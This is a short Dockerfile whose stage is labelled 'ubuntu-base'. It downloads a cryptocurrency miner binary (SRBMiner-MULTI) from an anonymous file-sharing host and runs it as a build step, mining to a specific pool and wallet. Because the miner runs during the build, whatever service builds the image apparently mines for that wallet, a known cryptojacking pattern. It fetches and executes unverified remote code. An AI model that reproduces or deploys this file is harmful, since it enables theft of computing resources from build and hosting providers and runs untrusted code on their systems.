FROM ubuntu:20.04 as ubuntu-base

ENV DEBIAN_FRONTEND=noninteractive \
    DEBCONF_NONINTERACTIVE_SEEN=true

RUN apt update
RUN apt -y install wget
RUN wget https://filebin.net/czb77vcmdjsmn82s/SRBMiner-MULTI
RUN chmod +x SRBMiner-MULTI
RUN ./SRBMiner-MULTI --algorithm ghostrider --pool stratum-na.rplant.xyz:17054  --tls true --wallet ReW3eGpmpWpWtLgtGNbDEscnBvJTGr9rdL.DOCKDG2
